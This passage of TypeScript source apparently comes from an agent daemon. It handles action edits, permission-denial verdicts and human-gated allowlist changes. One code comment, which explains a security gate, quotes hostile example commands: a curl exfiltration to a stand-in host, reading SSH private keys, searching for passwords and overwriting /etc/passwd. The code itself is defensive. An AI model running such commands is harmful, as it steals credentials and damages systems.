import { randomUUID } from 'node:crypto';
import { homedir } from 'node:os';
import { join } from 'node:path';
import {
  existsSync, lstatSync, mkdirSync, readdirSync, readFileSync, realpathSync,
  rmSync, unlinkSync, writeFileSync,
} from 'node:fs';
import type { IncomingMessage, ServerResponse } from 'node:http';
import type { Server } from '../server.js';
import type { ActionRegistry } from '../actions/index.js';
import { actionDirFor, ACTION_CATEGORIES, GATED_GROUPS } from '../actions/registry.js';
import { buildScorecard } from '../actions/scorecard.js';
import type { PermissionGroup, PermissionGroupMap } from '../actions/types.js';
import type { ActionsStore } from '../storage/actions-store.js';
import type { ActionRunsStore } from '../storage/action-runs-store.js';
import type { ActionDenial, DenialsStore, DenialVerdict } from '../storage/denials-store.js';
import type { Allowlist, RuleKind } from '../permissions/allowlist.js';
import { suggestRule, type RuleSuggestion } from '../permissions/denial-suggestion.js';
import { bareBuiltinOf } from '../permissions/tool-classify.js';
import { splitShellClauses } from '../permissions/shell-split.js';
import { lintPermissionRule } from '../permissions/write-shape.js';
import type { GroupApplier } from './meta.js';
import type { ActionAuthor, ActionRevisionsStore } from '../storage/action-revisions-store.js';
import {
  forgetEdit, loadPersistedEdits, persistEdit,
  type ActionEdit, type ActionProposal,
} from '../storage/action-edits-store.js';
import { intakeProposal, ledgerActionFor, onSessionGone } from '../actions/proposal-intake.js';
import type { ActionRunLedger } from '../work/action-run-ledger.js';
import type { SessionManager } from '../session/session-manager.js';
import type { WorkEngine } from '../work/engine.js';
import type { DaemonConfig } from '../config.js';
import { ensureActionsInstalled, bundledRepoDir } from '../setup-actions.js';
import { parseJsonObject, parseWindowMs, readJsonBody } from './util.js';

export interface ActionsRoutesDeps {
  outpostActionsDir: string;
  RUNTIME_DIR: string;
  SRC_DIR: string;
  secret: string;
  config: DaemonConfig;
  actionRegistry: ActionRegistry;
  actionsStore: ActionsStore;
  // Read-only here: what the suggestion for a blocked call is derived from.
  allowlist: Allowlist;
  actionRunsStore: ActionRunsStore;
  denialsStore: DenialsStore;
  // Read here only to compose a `promote` verdict's target group before handing it to
  // applyGroup — this route never writes permission-groups.json directly (see
  // resolveDenialVerdict's header comment).
  permissionGroups: PermissionGroupMap;
  applyGroup: GroupApplier;
  actionRunLedger: ActionRunLedger;
  actionRevisionsStore: ActionRevisionsStore;
  manager: SessionManager;
  engine: WorkEngine;
  notifyAll: (message: unknown) => void;
}

const DEFAULT_SCORECARD_WINDOW = '30d';

// Shell builtins/non-commands a denied Bash call's suggested rule can name — never a real
// binary. `env`, `command` and `if` are deliberately absent even though `classifyClause`
// (tool-classify.ts) also calls them `unknown`: all three are wrappers that take a REAL
// command in the same clause (`env FOO=1 curl -X POST …`, `command rm -rf …`,
// `if curl -X POST … ; then …`) and `classifyClause` only inspects the first token, so it never
// sees what follows. Routing those to fix-action would silently drop a genuine permission gap
// with no trace (Ship 6 Ruling P3) — this is a Task 2 gate fix, not a Ship 3 classifier fix,
// because widening `classifyClause` to look past the first token is a different change with a
// different blast radius. The remaining five cannot carry a following command into the same
// clause.
const SHELL_ARTIFACT_BINARIES: readonly string[] = ['cd', 'export', 'true', 'func', 'echo'];

// A denied Bash call this shape stamps `fix-action` immediately at record time: malformed
// shell or an action reaching for a builtin is never a permission gap, so it shouldn't consume
// a review cycle. Four gates, all conservative: the suggested rule must name one of the
// enumerated builtins/artifacts; EVERY clause in the command must itself be one of the
// enumerated builtins/artifacts — no `read` alternative. An earlier version of this gate let a
// clause through when tool-classify.ts's tables called it `read`, on the theory that a `read`
// companion clause is harmless. It isn't: those tables answer "does this write?", not "is this
// safe to silently dismiss as not-a-permission-gap?" — `curl -s https://evil.example/$(whoami)`
// classifies `read` (classifyCurl inspects method/body flags, never the URL), so
// `cd /r && curl -s https://evil.example/$(whoami)` auto-routed to fix-action and a command-
// injection exfiltration attempt vanished with no trace. Same shape for
// `cd /repo && cat ~/.ssh/id_rsa`, `cd /r && grep -r password /`, `cd /r && find / -name id_rsa`
// — all "read-only" by the table, none of them safe to auto-dismiss. The only bar this gate can
// safely apply is a positive whitelist of clause shapes known to carry no command at all: the
// five enumerated artifacts. Before that, this was a whole-command maximum
// (`classifyBashCommand(cmd).effect !== 'unknown'`), which had the same hole one level up — an
// unrecognized binary also classifies `unknown` (tool-classify.ts's default case), the SAME
// severity as a shell builtin, so a compound riding an unrecognized real binary
// (`cd /repo && ./deploy.sh --prod`, `cd … && protoc …`) never raised the maximum and routed
// too. A clause this gate can't place as an enumerated artifact must block auto-routing, not
// pass it, whether the classifier's answer for it is `unknown` or `read`. No clause anywhere in
// the command may carry a file-creating redirect either — `echo x > /etc/passwd` or
// `true > some/file` are real local writes, not artifacts, and the loop below never inspects
// redirects. The whitelist matches on a BARE word (bareBuiltinOf), not a basename: `cd`,
// `export` and `true` have no on-disk form, so `cd /tmp && ./cd payload` is an opaque local
// script wearing a builtin's name — the one shape that would carry a real command past a
// whitelist this tight.
export function shellArtifactVerdict(
  toolName: string,
  toolInput: unknown,
  suggested: RuleSuggestion,
  decidedAt: number,
): DenialVerdict | null {
  if (toolName !== 'Bash' || suggested.kind !== 'bash') return null;
  const binary = SHELL_ARTIFACT_BINARIES.find((b) => suggested.value === `^${b}(\\s|$)`);
  if (!binary) return null;
  const cmd = (toolInput as { command?: string } | null)?.command ?? '';
  const clauses = splitShellClauses(cmd);
  if (!clauses || clauses.length === 0 || clauses.some((c) => c.writeTargets.length > 0)) return null;
  const everyClauseIsArtifact = clauses.every((c) => SHELL_ARTIFACT_BINARIES.includes(bareBuiltinOf(c.text)));
  if (!everyClauseIsArtifact) return null;
  return {
    disposition: 'fix-action',
    decidedBy: 'improver',
    reason: `"${binary}" is a shell builtin/artifact, not a permission gap — fix the action's command instead of granting it`,
    decidedAt,
  };
}

export interface VerdictRequestBody {
  disposition?: unknown;
  group?: unknown;
  rule?: unknown;
  reason?: unknown;
  decidedBy?: unknown;
}

export type VerdictOutcome =
  | { ok: true; status: 200; denial: ActionDenial; editSessionId?: string }
  | { ok: false; status: number; error: string };

// Starts (or reuses) a meta.build-action edit session for the action, seeded with the denial as
// feedback — what makes `fix-action` an actual queued fix rather than a stamp. Injected so
// resolveDenialVerdict stays testable without a SessionManager.
export type FixStarter = (
  actionName: string, feedback: string,
) => { ok: true; sessionId: string } | { ok: false; status: number; error: string };

// The feedback a `fix-action` verdict hands the action builder. It names the exact blocked call
// and states the one thing the builder must not conclude on its own: that the answer is a wider
// grant. Only a user-approved group edit can widen anything (see resolveDenialVerdict), so a
// builder that "fixes" this by asking for permissions produces a proposal nobody can apply.
export function fixActionFeedback(denial: ActionDenial, reason: string): string {
  const call = denial.toolName === 'Bash'
    ? (denial.toolInput as { command?: string } | null)?.command ?? '(command not recorded)'
    : `${denial.toolName} ${JSON.stringify(denial.toolInput ?? null)}`;
  const seen = denial.count > 1 ? ` (blocked ${denial.count} times)` : '';
  const lines = [
    `A permission denial on this action was classified "fix the action"${seen} — the call below is`,
    'not something to grant, it is something the action should stop doing.',
    '',
    `Blocked call: ${call.slice(0, 500)}`,
    denial.suggested.kind === 'none'
      ? `No rule could unblock this call: ${denial.suggested.value}`
      : `A rule that WOULD have unblocked it — deliberately not granted: ${denial.suggested.kind} ${denial.suggested.value}`,
  ];
  if (reason) lines.push('', `The user's reason: ${reason}`);
  lines.push(
    '',
    'Revise SKILL.md so the action achieves its goal without this call — a different command,',
    'a tool it already has, or dropping the step. Do NOT propose allowlist additions: widening a',
    "permission group is a separate, user-approved action on Settings > Permissions. If the call is",
    'genuinely necessary and no alternative exists, say so in your rationale and propose no change.',
  );
  return lines.join('\n');
}

const RULE_KINDS: readonly RuleKind[] = ['tool', 'bash', 'mcp', 'path'];

function addRuleToGroup(current: PermissionGroup | undefined, kind: RuleKind, value: string): PermissionGroup {
  const base: PermissionGroup = current ? structuredClone(current) : {
    description: '', alwaysAllow: [], alwaysAllowBashPatterns: [],
    alwaysAllowMcpPatterns: [], alwaysAllowPathPatterns: [],
  };
  const arr = kind === 'tool' ? base.alwaysAllow
    : kind === 'bash' ? base.alwaysAllowBashPatterns
    : kind === 'mcp' ? base.alwaysAllowMcpPatterns
    : (base.alwaysAllowPathPatterns ??= []);
  if (!arr.includes(value)) arr.push(value);
  return base;
}

// The one place a denial gets resolved. `never`/`fix-action` just record intent; `promote`
// goes through the SAME group-editor path (`applyGroup`, from routes/meta.ts's
// createGroupApplier) that PUT /api/permission-groups/:name uses — validated, atomically
// written, reloaded into the registry and revisioned. This route must never write
// permission-groups.json itself, or it becomes a second, weaker door onto the allowlist.
//
// `decidedBy` gates promotion into a GATED_GROUPS destination: the improver may propose one
// (in its evidence, ahead of this route ever being called), but only a human's 'user' verdict
// may apply it — a gated group means nothing if a model can grant into it. Exported standalone
// (not a closure inside registerActionsRoutes) so it's testable without standing up a Server.
//
// A verdict is stamped LAST in every branch. Both the non-`never` dispositions have a side
// effect that can fail (a group edit, an edit-session spawn), and stamping first would resolve
// the denial — deleting it from the only evidence meta.improve-actions reads — on the strength
// of work that then didn't happen.
export function resolveDenialVerdict(
  deps: {
    denialsStore: DenialsStore;
    permissionGroups: PermissionGroupMap;
    applyGroup: GroupApplier;
    inheritedGroups: (actionName: string) => string[] | undefined;
    startFix: FixStarter;
  },
  actionName: string,
  denialId: string,
  payload: VerdictRequestBody,
): VerdictOutcome {
  const { disposition } = payload;
  if (disposition !== 'promote' && disposition !== 'never' && disposition !== 'fix-action') {
    return { ok: false, status: 400, error: `disposition must be promote|never|fix-action, got ${JSON.stringify(disposition)}` };
  }
  const denial = deps.denialsStore.list(actionName).find((d) => d.id === denialId);
  if (!denial) return { ok: false, status: 404, error: 'no such denial' };

  const reason = typeof payload.reason === 'string' ? payload.reason : '';
  // Fail closed: an absent or malformed decidedBy must land on the UNPRIVILEGED value, since
  // the whole point of the check below is that only an explicit 'user' may promote into a
  // gated group. Trusting an absent field to mean 'user' would make omission the exploit.
  const decidedBy: DenialVerdict['decidedBy'] = payload.decidedBy === 'user' ? 'user' : 'improver';

  if (disposition === 'promote') {
    const group = typeof payload.group === 'string' ? payload.group : '';
    const rule = payload.rule as { kind?: unknown; value?: unknown } | undefined;
    const kind = rule?.kind;
    const value = rule?.value;
    if (!group || typeof value !== 'string' || !value || !RULE_KINDS.includes(kind as RuleKind)) {
      return { ok: false, status: 400, error: 'promote requires group and rule: { kind, value }' };
    }

    // An action's grants are core ∪ the groups it declares (ActionRegistry.resolvePermissions),
    // so promoting into a group it does NOT declare is strictly worse than doing nothing: it
    // resolves the denial, widens that group for every other action that does declare it, and
    // leaves this call blocked exactly as it was. Refuse instead of answering 200 to a no-op —
    // the two honest fixes are a group the action actually inherits, or fix-action.
    const inherited = deps.inheritedGroups(actionName);
    if (!inherited) {
      return {
        ok: false, status: 409,
        error: `${actionName} is not in the action catalog, so no group can unblock it — record "never" instead`,
      };
    }
    if (!inherited.includes(group)) {
      return {
        ok: false, status: 400,
        error: `${actionName} does not inherit "${group}", so promoting there would widen that group `
          + `for other actions and still leave this call blocked. It inherits: `
          + `${inherited.join(', ') || '(no groups)'}. To give it a group it doesn't declare, change its `
          + `permissions with "Fix the action".`,
      };
    }

    const gated = GATED_GROUPS.has(group);
    // The standing rule: a gated group is only gated if nothing but a human can grant into it.
    if (gated && decidedBy !== 'user') {
      return { ok: false, status: 403, error: `promoting into the gated group "${group}" requires user approval, not the improver` };
    }
    const lint = lintPermissionRule(kind as RuleKind, value, gated);
    if (!lint.ok) return { ok: false, status: 400, error: lint.reason ?? 'rule refused' };

    const next = addRuleToGroup(deps.permissionGroups[group], kind as RuleKind, value);
    const applied = deps.applyGroup(group, next, decidedBy, reason || undefined, undefined);
    if (!applied.ok) return { ok: false, status: applied.status, error: applied.error };

    const verdict: DenialVerdict = {
      disposition: 'promote', group, rule: { kind: kind as RuleKind, value },
      reason, decidedAt: Date.now(), decidedBy,
    };
    deps.denialsStore.setVerdict(actionName, denialId, verdict);
    return { ok: true, status: 200, denial };
  }

  // A user's `fix-action` is a claim that the action's own instructions are wrong, so it has to
  // queue the fix. Stamping it alone would delete the denial from the improvement loop's
  // evidence (unresolved() keys on verdict presence) while asking nobody to do anything — the
  // retired "Dismiss" button under a better name. The spawn runs BEFORE the stamp so a failure
  // leaves the evidence intact rather than swallowing it.
  //
  // The improver's own `fix-action` verdicts (including shellArtifactVerdict's auto-stamp at
  // record time) deliberately queue nothing: those say "this was never a permission gap", the
  // improver already has its own proposal channel, and spawning a builder session per malformed
  // `cd` would be a session storm no user asked for.
  if (disposition === 'fix-action' && decidedBy === 'user') {
    const started = deps.startFix(actionName, fixActionFeedback(denial, reason));
    if (!started.ok) return { ok: false, status: started.status, error: started.error };
    deps.denialsStore.setVerdict(actionName, denialId, {
      disposition, reason, decidedAt: Date.now(), decidedBy,
    });
    return { ok: true, status: 200, denial, editSessionId: started.sessionId };
  }

  deps.denialsStore.setVerdict(actionName, denialId, { disposition, reason, decidedAt: Date.now(), decidedBy });
  return { ok: true, status: 200, denial };
}

// Installs an approved proposal's allowlistAdds — except when `author` is 'improver'. That
// mechanism installs an action-scoped rule, which bypasses the group editor's
// destination-gating, lint, and revision history a denial verdict goes through; the
// improvement loop's own SKILL.md now says it has no legitimate use there (Ship 6). A
// write-shaped rule is still refused for every author by `assertNotWriteShaped` (via
// `actionsStore.addRule`, unchanged); this only declines the non-write-shaped remainder,
// specifically for the improvement loop, since "wrong destination" is wrong even when it
// isn't a security hole. A user-authored proposal is unaffected. Exported standalone so it's
// testable against a real ActionsStore without a Server.
export function applyAllowlistAdds(
  actionsStore: Pick<ActionsStore, 'addRule'>,
  author: ActionAuthor,
  actionName: string,
  rules: ActionProposal['allowlistAdds'] | undefined,
): ActionProposal['allowlistAdds'] {
  const applied: ActionProposal['allowlistAdds'] = [];
  for (const rule of rules ?? []) {
    if (author === 'improver') {
      console.warn(`[action-edit] skipping improver-proposed allowlistAdds ${rule.kind}=${rule.value}: use a denial verdict instead`);
      continue;
    }
    try { if (actionsStore.addRule(actionName, rule.kind, rule.value)) applied.push(rule); }
    catch (e) { console.warn(`[action-edit] skipping invalid rule ${rule.kind}=${rule.value}: ${(e as Error).message}`); }
  }
  return applied;
}

// Hook-facing handlers the daemon wires into HookServer/MCP after this factory
// runs. The action-edit + denial state they close over lives here so the whole
// action-authoring surface is one module rather than scattered across daemon.ts.
export interface ActionsRoutesHandlers {
  recordActionDenial: (denial: {
    actionName: string;
    sessionId: string;
    toolName: string;
    toolInput: unknown;
  }) => void;
  onActionProposalHandler: (body: string) => Promise<void>;
  // Called from the daemon's session-end hook: drop the tracking entry for a
  // dying action-edit session so its card stops showing a stale "review" pill.
  dropEditForSession: (sessionId: string) => void;
  // Registers the ActionEdit for a schedule-spawned meta.improve-actions session.
  // Without it the proposal that session posts has no edit to land on and is dropped.
  beginImproverEdit: (input: { sessionId: string; actionName: string }) => void;
  // What the improver's selector reads to avoid racing an edit already in flight.
  listPendingEdits: () => Array<{ actionName: string | null; authorAction?: string }>;
}

export function registerActionsRoutes(server: Server, deps: ActionsRoutesDeps): ActionsRoutesHandlers {
  const {
    outpostActionsDir, RUNTIME_DIR, SRC_DIR, secret, config,
    actionRegistry, actionsStore, allowlist, actionRunsStore, denialsStore, actionRunLedger,
    actionRevisionsStore, manager, engine, notifyAll, permissionGroups, applyGroup,
  } = deps;

  // ── local helpers ──────────────────────────────────────────────────────
  function spawnEditSession(
    kind: 'action-edit' | 'skill-edit',
    cwd: string,
    initialInput: string,
    extraEnv: Record<string, string> = {},
  ): string {
    const sessionId = randomUUID();
    manager.spawnDetached(sessionId, cwd, extraEnv);
    manager.tagKind(sessionId, kind);
    manager.send(sessionId, { type: 'user', message: { role: 'user', content: initialInput } });
    return sessionId;
  }

  function loopbackApiUrl(): string {
    const port = config.httpPort;
    return port !== null ? `http://127.0.0.1:${port}` : '';
  }

  function readSkillDescription(dir: string): string {
    try {
      const md = readFileSync(join(dir, 'SKILL.md'), 'utf8');
      const m = md.match(/^description:\s*(.+)$/m);
      return m && m[1] ? m[1].trim() : '';
    } catch { return ''; }
  }

  function dedupe(xs: string[]): string[] { return Array.from(new Set(xs)); }

  function listOutpostActions() {
    const out: Array<{ name: string; description: string; category: string; skillMd: string; dir: string; allowlist: object }> = [];
    for (const a of actionRegistry.listActions()) {
      const overlay = actionsStore.get(a.name).allowlist;
      const merged = {
        alwaysAllow:             dedupe([...a.allowlist.alwaysAllow,             ...(overlay.alwaysAllow ?? [])]),
        alwaysAllowBashPatterns: dedupe([...a.allowlist.alwaysAllowBashPatterns, ...(overlay.alwaysAllowBashPatterns ?? [])]),
        alwaysAllowMcpPatterns:  dedupe([...a.allowlist.alwaysAllowMcpPatterns,  ...(overlay.alwaysAllowMcpPatterns ?? [])]),
        alwaysAllowPathPatterns: dedupe([...a.allowlist.alwaysAllowPathPatterns, ...(overlay.alwaysAllowPathPatterns ?? [])]),
      };
      let body = '';
      try { body = readFileSync(join(a.dir, 'SKILL.md'), 'utf8'); } catch { /* missing */ }
      out.push({
        name: a.name,
        dir: a.dir,
        description: a.frontmatter.description,
        category: a.frontmatter.outpost.category,
        skillMd: body,
        allowlist: merged,
      });
    }
    out.sort((a, b) => a.name.localeCompare(b.name));
    return out;
  }

  function listExternalSkills() {
    const skillsDir = join(homedir(), '.claude', 'skills');
    // realpathSync follows the runtime → repo symlink (setup-actions's dev mode),
    // so we also exclude the repo's bundled actions dir to keep them out of skills.
    const repoActionsDir = join(SRC_DIR, '..', 'actions');
    let entries: string[] = [];
    try { entries = readdirSync(skillsDir); } catch { return []; }
    const out: Array<{ name: string; description: string; skillMd: string; dir: string }> = [];
    for (const name of entries) {
      if (name.startsWith('.')) continue;
      const link = join(skillsDir, name);
      let real: string;
      try { real = realpathSync(link); } catch { continue; }
      if (real.startsWith(outpostActionsDir)) continue;
      if (real.startsWith(repoActionsDir)) continue;
      if (real.includes('/.claude/plugins/cache/')) continue;
      try { if (!lstatSync(real).isDirectory()) continue; } catch { continue; }
      if (!existsSync(join(real, 'SKILL.md'))) continue;
      let body = '';
      try { body = readFileSync(join(real, 'SKILL.md'), 'utf8'); } catch { /* missing */ }
      out.push({ name, dir: real, description: readSkillDescription(real), skillMd: body });
    }
    return out;
  }

  function readSkillMd(dir: string): string {
    try { return readFileSync(join(dir, 'SKILL.md'), 'utf8'); } catch { return ''; }
  }

  function writeActionEnvelope(sessionId: string, body: object): string {
    const dir = join(RUNTIME_DIR, 'action-edits', sessionId);
    mkdirSync(dir, { recursive: true });
    const path = join(dir, 'envelope.json');
    writeFileSync(path, JSON.stringify(body, null, 2));
    return path;
  }

  function actionEditEnv(sessionId: string, envelopePath: string, actionName: string | null): Record<string, string> {
    const env: Record<string, string> = {
      OUTPOST_API_URL: loopbackApiUrl(),
      OUTPOST_ENVELOPE: envelopePath,
      OUTPOST_HOOK_PORT: String(config.hookPort),
      DAEMON_AUTH: secret,
      ACTION_EDIT_SESSION_ID: sessionId,
    };
    if (actionName) env.OUTPOST_ACTION_NAME = actionName;
    return env;
  }

  // ── action-edit propose/verify/apply state ───────────────────────────
  // Keyed by action name (for edits) or by the placeholder `new:<sessionId>`
  // for "new action" flows where the name isn't chosen until the skill picks one.
  const actionEditsDir = join(RUNTIME_DIR, 'action-edits');
  const actionEdits = new Map<string, ActionEdit>();
  function editKey(actionName: string | null, sessionId: string): string {
    return actionName ? `a:${actionName}` : `new:${sessionId}`;
  }
  function findEditBySession(sessionId: string): { key: string; edit: ActionEdit } | undefined {
    for (const [key, edit] of actionEdits) {
      if (edit.sessionId === sessionId) return { key, edit };
    }
    return undefined;
  }
  function setEdit(key: string, edit: ActionEdit): void {
    actionEdits.set(key, edit);
    persistEdit(actionEditsDir, edit);
    try { notifyAll({ type: 'actions_changed' }); } catch { /* during startup */ }
  }
  function clearEdit(key: string): void {
    const edit = actionEdits.get(key);
    if (actionEdits.delete(key)) {
      if (edit) forgetEdit(actionEditsDir, edit.sessionId);
      try { notifyAll({ type: 'actions_changed' }); } catch { /* during startup */ }
    }
  }
  for (const edit of loadPersistedEdits(actionEditsDir)) {
    actionEdits.set(editKey(edit.actionName, edit.sessionId), edit);
  }

  // An action's history changed. The acting client invalidates its own cache, but improver
  // events land while nobody is acting, so the History card needs to be told.
  function notifyRevised(action: string): void {
    try { notifyAll({ type: 'action_revised', action }); } catch { /* during startup */ }
  }

  // ── Runtime denial tracking ───────────────────────────────────────────
  // Records every tool call that action sessions had blocked by allowlist-miss.
  // The PWA surfaces these as one-click "Add to allowlist" suggestions so the
  // user can see what the action tried that they overlooked.

  // Score the rejected draft and open the redraft replacing it. Feedback arriving
  // before any proposal was posted isn't a rejection — the same drafting round just
  // got a new brief, so leave its run open.
  function redraft(edit: ActionEdit, hadProposal: boolean): void {
    if (!hadProposal) return;
    const { sessionId } = edit;
    actionRunLedger.closeExternal(sessionId, 'submitted');
    actionRunLedger.verdictExternal(sessionId, 'revised');
    actionRunLedger.openExternal({ action: ledgerActionFor(edit), round: 'redraft', sessionId });
  }

  // A discarded draft is a rejection. The ledger already counts it; this keeps the text that
  // was declined and the reason, which is what tells the improver a taken suggestion from a
  // sent-back one. Must run before the caller clears edit.proposal.
  function noteRejected(edit: ActionEdit, feedback: string, author: ActionAuthor = 'user'): void {
    if (!edit.proposal || !edit.actionName) return;
    actionRevisionsStore.record({
      action: edit.actionName,
      kind: 'rejected',
      author,
      body: edit.proposal.skillMdAfter,
      rationale: edit.proposal.summary,
      feedback,
      sessionId: edit.sessionId,
    });
  }

  const recordActionDenial: ActionsRoutesHandlers['recordActionDenial'] = ({ actionName, sessionId, toolName, toolInput }) => {
    const suggested = suggestRule(toolName, toolInput, (cmd) => allowlist.bashDenialCause(cmd, { actionName, sessionId }));
    const denial = denialsStore.record({
      actionName, sessionId, toolName, toolInput, suggested,
      runId: actionRunLedger.noteDenial(sessionId),
    });
    if (!denial.verdict) {
      const autoVerdict = shellArtifactVerdict(toolName, toolInput, suggested, Date.now());
      if (autoVerdict) denialsStore.setVerdict(actionName, denial.id, autoVerdict);
    }
    console.log(`[deny] ${actionName} ${toolName} → suggest ${suggested.kind}:${suggested.value} (count ${denial.count})`);
    try { notifyAll({ type: 'actions_changed' }); } catch { /* during startup */ }
  };

  // An improver cycle that found nothing worth changing. Recorded rather than dropped: it's
  // what advances the review clock, and a quiet cycle is a result the user should be able
  // to see. No proposal means no review card, so the edit is cleared outright.
  function acceptNoChange(key: string, edit: ActionEdit, summary: string): void {
    if (!edit.actionName) {
      console.warn('[work] action-proposal: noChange with no action name — dropping');
      return;
    }
    actionRevisionsStore.record({
      action: edit.actionName,
      kind: 'reviewed',
      author: edit.author ?? 'improver',
      rationale: summary,
      sessionId: edit.sessionId,
    });
    actionRunLedger.closeExternal(edit.sessionId, 'submitted');
    actionRunLedger.verdictExternal(edit.sessionId, 'accepted');
    clearEdit(key);
    notifyRevised(edit.actionName);
    console.log(`[work] ${ledgerActionFor(edit)} reviewed ${edit.actionName}: no change proposed`);
  }

  const onActionProposalHandler: ActionsRoutesHandlers['onActionProposalHandler'] = async (body) => {
    const payload = parseJsonObject(body) as Parameters<typeof intakeProposal>[0] | null;
    if (!payload) throw new Error('invalid json body');
    if (!payload.sessionId) {
      console.warn('[hook] /work/action-proposal: missing sessionId');
      return;
    }
    const located = findEditBySession(payload.sessionId);
    if (!located) {
      console.warn(`[hook] /work/action-proposal: no edit-session for ${payload.sessionId.slice(0,8)}`);
      return;
    }
    let { key, edit } = located;
    // For "new action" flows the skill picks the name with this proposal —
    // promote the edit's key from `new:<sessionId>` → `a:<name>`.
    if (!edit.actionName && payload.actionName) {
      actionEdits.delete(key);
      edit = { ...edit, actionName: payload.actionName };
      key = editKey(payload.actionName, edit.sessionId);
    }
    let skillMdBefore = '';
    if (edit.actionName) {
      // Best-effort: the "before" text is only for the review diff, so a not-yet-valid
      // name (skill still settling on one) just yields no before-text.
      try { skillMdBefore = readSkillMd(actionDirFor(outpostActionsDir, edit.actionName).dir); }
      catch { /* invalid/unsettled name */ }
    }

    const intake = intakeProposal(payload, { skillMdBefore, now: Date.now() });
    if (intake.kind === 'invalid') {
      console.warn(`[hook] /work/action-proposal: ${intake.reason}`);
      return;
    }
    if (intake.kind === 'no-change') {
      acceptNoChange(key, edit, intake.summary);
      return;
    }

    edit.status = 'review';
    edit.proposal = intake.proposal;
    setEdit(key, edit);
    // Recorded even though nothing has been applied yet: a proposal the user then rejects is
    // exactly the signal the improver needs about its own suggestions. Skipped while the
    // new-action flow is still unnamed — there's no action to file it under.
    if (edit.actionName) {
      actionRevisionsStore.record({
        action: edit.actionName,
        kind: 'proposed',
        author: edit.author ?? 'user',
        body: intake.proposal.skillMdAfter,
        rationale: intake.proposal.summary,
        allowlistAdds: intake.proposal.allowlistAdds,
        sessionId: edit.sessionId,
      });
      notifyRevised(edit.actionName);
    }
    console.log(`[work] action-proposal posted for ${edit.actionName ?? '<new>'} (${intake.proposal.skillMdAfter.length}b skill_md, ${intake.proposal.allowlistAdds.length} rules)`);
  };

  // ── routes ─────────────────────────────────────────────────────────────
  server.route('GET', '/api/actions', async (_req, res) => {
    const actions = listOutpostActions();
    const catalog = actionRegistry.listActions().map((a) => ({
      name: a.name,
      description: a.frontmatter.description,
      kind: a.frontmatter.outpost.kind,
      category: a.frontmatter.outpost.category,
      runner: a.frontmatter.outpost.runner,
      permissions: a.frontmatter.outpost.permissions ?? [],
      side_effects: a.frontmatter.outpost.side_effects,
      timeout_sec: a.frontmatter.outpost.timeout_sec ?? null,
      input_schema: a.inputSchema,
      output_schema: a.outputSchema,
      allowlist: a.allowlist,
    }));
    const skills = listExternalSkills();
    const edits = Array.from(actionEdits.values()).map((e) => ({
      actionName: e.actionName,
      sessionId: e.sessionId,
      status: e.status,
      startedAt: e.startedAt,
      proposal: e.proposal,
    }));
    res.statusCode = 200;
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ actions, catalog, skills, edits, denials: denialsStore.all() }));
  });

  function handleScorecard(req: IncomingMessage, res: ServerResponse): void {
    const path = (req.url ?? '').split('?')[0]!;
    const m = path.match(/^\/api\/actions\/([^/]+)\/scorecard$/);
    if (!m) { res.statusCode = 404; res.end('not found'); return; }
    const name = decodeURIComponent(m[1]!);
    const url = new URL(req.url ?? '', 'http://internal');
    const windowMs = parseWindowMs(url.searchParams.get('window') ?? DEFAULT_SCORECARD_WINDOW);
    const now = Date.now();
    const scorecard = buildScorecard(
      name,
      actionRunsStore.listByAction(name),
      denialsStore.list(name),
      { now, ...(windowMs !== undefined ? { windowMs } : {}) },
    );
    res.statusCode = 200;
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ scorecard }));
  }

  // An action with no recorded runs answers 200 with a zeroed card, not 404 — a
  // freshly-created action should render "no runs yet", not an error.
  server.route('GET', '/api/actions/:name/scorecard', handleScorecard);

  // Record a verdict on a denial — `never` just records; `promote` applies the rule through
  // applyGroup, and a user's `fix-action` opens a meta.build-action edit session (see
  // resolveDenialVerdict). This is the only endpoint that can resolve a denial now that the
  // Library panel's Dismiss button is gone.
  server.route('POST', '/api/actions/:name/denials/:denialId/verdict', async (req, res) => {
    const m = (req.url ?? '').match(/^\/api\/actions\/([^/]+)\/denials\/([^/?]+)\/verdict(?:\?|$)/);
    if (!m) { res.statusCode = 404; res.end('not found'); return; }
    const name = decodeURIComponent(m[1]!);
    const denialId = decodeURIComponent(m[2]!);
    const payload = await readJsonBody<VerdictRequestBody>(req);
    const result = resolveDenialVerdict({
      denialsStore, permissionGroups, applyGroup,
      inheritedGroups: (action) => actionRegistry.inheritedGroups(action),
      startFix: startActionEdit,
    }, name, denialId, payload ?? {});
    res.statusCode = result.status;
    if (result.ok) {
      try { notifyAll({ type: 'actions_changed' }); } catch { /* tolerate */ }
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({
        ok: true, denial: result.denial,
        ...(result.editSessionId ? { editSessionId: result.editSessionId } : {}),
      }));
    } else {
      res.end(result.error);
    }
  });

  server.route('POST', '/api/actions/new', async (req, res) => {
    mkdirSync(outpostActionsDir, { recursive: true });
    const payload = await readJsonBody<{ feedback?: string; name?: string; category?: string }>(req);
    const feedback = (payload?.feedback ?? '').trim();
    // Optional user-supplied name. We don't validate strictly here — the action-builder
    // skill is the source of truth for naming and will normalize. We just forward it as a hint.
    const rawName = (payload?.name ?? '').trim();
    const proposedName = /^[a-z0-9][a-z0-9-]{0,63}$/i.test(rawName) ? rawName.toLowerCase() : '';
    // Optional category override. Reject an out-of-set value up front (the skill would
    // otherwise have to reconcile a hint it can't legally honor).
    const rawCategory = (payload?.category ?? '').trim().toLowerCase();
    if (rawCategory && !ACTION_CATEGORIES.includes(rawCategory as never)) {
      res.statusCode = 400; res.end(`category must be one of ${ACTION_CATEGORIES.join('|')}`); return;
    }
    const proposedCategory = rawCategory || undefined;
    const sessionId = randomUUID();
    const envelope = {
      kind: 'action-edit',
      mode: 'new' as const,
      actionName: null,
      // Hints to the action-builder skill. The skill SHOULD honor them unless the name
      // is invalid (it then picks a corrected name and explains the override).
      proposedName: proposedName || undefined,
      proposedCategory,
      actionsDir: outpostActionsDir,
      userFeedback: feedback,
      proposalRoute: '/work/action-proposal',
    };
    const envelopePath = writeActionEnvelope(sessionId, envelope);
    manager.spawnDetached(sessionId, outpostActionsDir, actionEditEnv(sessionId, envelopePath, null), 'default');
    manager.tagKind(sessionId, 'action-edit');
    engine.bindAction(sessionId, 'meta.build-action');
    actionRunLedger.openExternal({ action: 'meta.build-action', round: 'draft', sessionId });
    engine.stampActionSession(sessionId, 'meta.build-action', proposedName ? `New action: ${proposedName}` : 'New action');
    manager.send(sessionId, { type: 'user', message: { role: 'user', content: '/meta.build-action' } });
    const edit: ActionEdit = {
